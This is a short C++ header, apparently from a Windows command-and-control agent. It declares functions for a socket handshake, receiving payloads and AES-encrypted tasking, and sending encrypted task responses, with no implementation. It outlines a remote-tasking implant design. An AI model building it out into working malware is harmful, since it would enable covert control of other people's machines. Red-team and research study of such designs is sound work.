#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <iostream>
#include <resp_builder.hpp>
#include <module_context.h>

void recv_hellorequest(SOCKET s, char *buffer, int& size);
void recv_payloadinfo(SOCKET s, char* buffer, int& size);
void recv_payload(SOCKET s, char* buffer, int size);
void send_hellorequest(SOCKET s, char *buffer, int size);
DWORD recv_encrypted_taskinfo(std::vector<UCHAR> aes_key, std::vector<UCHAR> iv, SOCKET s, std::vector<UCHAR> &data);

void send_encrypted_taskresponse(VOID *pctx, char* buffer, int len);
void send_encrypted_taskresponse_big(VOID *pctx, std::vector<UCHAR> buffer, ResponseBuilder* builder);
